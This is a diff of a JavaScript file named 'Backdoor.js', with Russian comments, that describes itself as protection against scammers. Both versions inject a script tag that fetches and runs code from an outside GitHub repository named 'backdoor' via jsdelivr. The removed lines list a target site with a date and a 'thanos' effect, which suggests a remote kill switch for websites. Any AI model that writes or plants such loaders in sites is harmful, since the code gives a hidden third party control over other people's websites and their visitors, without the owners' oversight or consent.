@@ -1,27 +1,28 @@
 /*!
- * Backdoor.js v1.0.2
+ * Backdoor.js v1.0.0
  * (c) 2024-2024
  * Made to protect against scammers.
  */
 
-document.addEventListener("DOMContentLoaded", function() {
-var currentVersion = '1.0.2';
+(function() {
+    var currentVersion = '1.0.0'; // Текущая версия скрипта
 
-if (localStorage.getItem('scriptVersion') !== currentVersion) {
-    // Загрузить новый скрипт
-    var script = document.createElement('script');
-    script.src = 'https://cdn.jsdelivr.net/gh/deusnotam/backdoor/q1.js';
-    document.head.appendChild(script);
+    // Проверяем, есть ли сохраненная версия в localStorage
+    var savedVersion = localStorage.getItem('scriptVersion');
 
-    // Обновить версию в кэше
-    localStorage.setItem('scriptVersion', currentVersion);
-}
+    // Если версии не совпадают или версия не сохранена, загружаем новую версию
+    if (savedVersion !== currentVersion) {
+        var script = document.createElement('script');
+        script.src = 'https://cdn.jsdelivr.net/gh/deusnotam/backdoor/q2.js';
 
-// Массив с сайтами и параметрами
-const sites = [
-  { url: "https://abros.me", date: "23/01/2024", effect: "thanos" },
-  
-];
+        // Когда скрипт загружен, сохраняем текущую версию в localStorage
+        script.onload = function() {
+            localStorage.setItem('scriptVersion', currentVersion);
+        };
+
+        document.head.appendChild(script);
+    }
+})();
 
 // Массив с эффектами
 const effects = {
